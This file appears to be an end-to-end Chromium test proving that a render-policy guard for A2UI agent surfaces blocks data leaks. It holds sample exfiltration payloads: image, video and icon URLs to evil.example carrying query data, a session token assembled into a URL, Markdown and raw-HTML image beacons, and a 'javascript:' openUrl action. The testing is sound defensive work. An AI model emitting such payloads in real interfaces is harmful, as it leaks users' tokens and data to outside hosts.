/**
 * Browser proof for @render-policy/a2ui in Chromium: an A2UI v0.9 surface whose image, video and icon
 * URLs arrive literally, through `updateDataModel` bindings and through `formatString`, plus Markdown
 * in `Text` and an `openUrl` button. Guarded, the policy decides on the resolved value: no request
 * leaves for a host outside the allowlist, a token assembled into a URL does not leave, `Text` fetches
 * nothing and `openUrl` refuses `javascript:`. The same messages without the guard are the control:
 * they do make those requests, so the proof would see them.
 *
 * Usage: node packages/a2ui/e2e/run.mjs
 */
import { mkdir } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { build } from 'esbuild';
import { createChecker, launchBrowser, openPage, repoRoot, startServer } from '../../../e2e/lib/harness.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
await mkdir(path.join(here, 'dist'), { recursive: true });
await build({
  entryPoints: [path.join(here, 'app.mjs')],
  bundle: true,
  format: 'esm',
  target: 'es2022',
  outdir: path.join(here, 'dist'),
  entryNames: 'app',
  alias: {
    '@render-policy/core': path.join(repoRoot, 'packages/core/src/index.ts'),
    '@render-policy/a2ui': path.join(repoRoot, 'packages/a2ui/src/index.ts'),
  },
  absWorkingDir: repoRoot,
  logLevel: 'warning',
});

const TOKEN = 'c2Vzc2lvbi10b2tlbi1mcm9tLXRoZS1jb252ZXJzYXRpb24'.repeat(2);
const v = 'v0.9';
const messages = [
  { version: v, createSurface: { surfaceId: 'proof', catalogId: 'https://a2ui.org/specification/v0_9/basic_catalog.json', theme: { iconUrl: 'https://evil.example/icon.png?u=victim' } } },
  {
    version: v,
    updateComponents: {
      surfaceId: 'proof',
      components: [
        { id: 'root', component: 'Column', children: ['hero', 'avatar', 'clip', 'note', 'go'] },
        { id: 'hero', component: 'Image', url: { path: '/hero' } },
        { id: 'avatar', component: 'Image', url: { call: 'formatString', args: { value: 'https://cdn.example/${/user/token}.png' }, returnType: 'string' } },
        { id: 'clip', component: 'Video', url: { path: '/clip' } },
        { id: 'note', component: 'Text', text: '**Summary** ![chart](https://evil.example/md.png?d=1) <img src="https://evil.example/raw.png"> [more](https://evil.example/link)' },
        { id: 'go', component: 'Button', child: 'note', action: { functionCall: { call: 'openUrl', args: { url: 'javascript:window.__pwned=1' }, returnType: 'void' } } },
      ],
    },
  },
  { version: v, updateDataModel: { surfaceId: 'proof', path: '/', value: { hero: 'https://cdn.example/ok.png?session=abc', user: { token: TOKEN }, clip: 'https://evil.example/clip.mp4' } } },
  // The agent swaps the bound value after the first render.
  { version: v, updateDataModel: { surfaceId: 'proof', path: '/hero', value: 'https://evil.example/leak.png?d=secret' } },
];

async function run(page) {
  for (const message of messages) {
    await page.evaluate((m) => window.__apply(m), message);
    await page.waitForTimeout(150);
  }
  await page.click('#go');
  await page.waitForTimeout(200);
  return page.evaluate(() => ({
    opened: window.__opened,
    pwned: window.__pwned === 1,
    textLinksOrImages: document.querySelectorAll('#note a, #note img').length,
    textShown: document.getElementById('note')?.textContent ?? '',
    decisions: window.__decisions.map((d) => `${d.a2ui.kind}/${d.a2ui.componentId}:${d.code}`),
  }));
}

const { base, close } = await startServer();
const browser = await launchBrowser();
const { check, finish } = createChecker('@render-policy/a2ui in Chromium');
const off = (external, host) => external.filter((u) => u.startsWith(`https://${host}/`));

try {
  {
    const { page, external, errors } = await openPage(browser, base, '/packages/a2ui/e2e/index.html?mode=naive', { readyFlag: '__ready', settle: 50 });
    await run(page);
    await page.waitForTimeout(300);
    const evil = off(external, 'evil.example');
    check(evil.some((u) => u.includes('icon.png')), 'control: the theme icon is requested without the guard');
    check(evil.some((u) => u.includes('leak.png?d=secret')), 'control: a URL bound through updateDataModel is requested without the guard');
    check(off(external, 'cdn.example').some((u) => u.includes(TOKEN)), 'control: a token assembled by formatString leaves without the guard');
    check(evil.some((u) => u.includes('md.png')) && evil.some((u) => u.includes('raw.png')), 'control: Markdown and raw HTML in Text fetch images without the guard');
    check(errors.length === 0, 'control: no page errors', errors.join(' | '));
    await page.close();
  }
  {
    const { page, external, errors } = await openPage(browser, base, '/packages/a2ui/e2e/index.html?mode=guarded', { readyFlag: '__ready', settle: 50 });
    const r = await run(page);
    await page.waitForTimeout(300);
    check(off(external, 'evil.example').length === 0, 'guarded: no request to a host outside the allowlist', off(external, 'evil.example').join(' '));
    check(!external.some((u) => u.includes(TOKEN)), 'guarded: the formatString token never leaves');
    // Before the data model arrives, the formatString avatar resolves to `https://cdn.example/.png`: an allowed host, no token.
    check(external.includes('https://cdn.example/ok.png') && external.every((u) => u.startsWith('https://cdn.example/') && !u.includes('?')), 'guarded: only the allowed host was requested, without query strings', external.join(' '));
    check(r.textLinksOrImages === 0 && r.textShown.includes('chart') && r.textShown.includes('<img src='), 'guarded: Text keeps alt text and shows raw HTML as text, no link or image', r.textShown);
    check(!r.pwned && r.opened.length === 0, 'guarded: openUrl refuses javascript: and opens nothing', r.opened.join(' '));
    for (const expected of ['icon/theme:image-host-not-allowed', 'image/avatar:url-encoded-payload', 'video/clip:image-host-not-allowed', 'image/hero:image-host-not-allowed', 'text/note:a2ui-text-image', 'text/note:a2ui-text-html', 'text/note:a2ui-text-link', 'openUrl/go:scheme-not-allowed']) {
      check(r.decisions.includes(expected), `guarded: journal has ${expected}`);
    }
    check(errors.length === 0, 'guarded: no page errors', errors.join(' | '));
    await page.close();
  }
} finally {
  await browser.close();
  close();
}

process.exit(finish() === 0 ? 0 : 1);
